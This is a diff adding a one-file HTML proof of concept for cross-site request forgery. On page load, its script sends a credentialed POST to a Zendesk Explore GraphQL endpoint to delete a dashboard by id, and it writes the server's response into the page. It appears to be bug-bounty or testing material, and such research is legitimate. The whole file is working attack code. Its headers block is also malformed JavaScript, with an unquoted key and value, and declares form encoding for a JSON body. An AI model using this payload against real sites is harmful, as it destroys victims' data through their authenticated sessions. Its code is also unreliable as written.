@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h3>CSRF PoC - GraphQL DeleteDashboard</h3>
+
+    <script>
+      fetch("https://bb-tiger2002.zendesk.com/explore/graphql?DeleteDashboard", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          Content-Type: application/x-www-form-urlencoded
+        },
+        body: JSON.stringify({
+          operationName: "DeleteDashboard",
+          variables: {
+            input: {
+              dashboardId: "73563402"
+            }
+          },
+          query: `
+            mutation DeleteDashboard($input: DeleteDashboardInput!) {
+              deleteDashboard(input: $input) {
+                dashboardId
+              }
+            }
+          `
+        })
+      })
+      .then(async (res) => {
+        const text = await res.text();
+
+        console.log("Status:", res.status);
+        console.log("Response:", text);
+
+        document.body.innerHTML += `
+          <p>Status: ${res.status}</p>
+          <pre>${text}</pre>
+        `;
+      })
+      .catch(err => {
+        console.log("Request failed:", err);
+        document.body.innerHTML += `<p>Error: ${err}</p>`;
+      });
+    </script>
+  </body>
+</html>
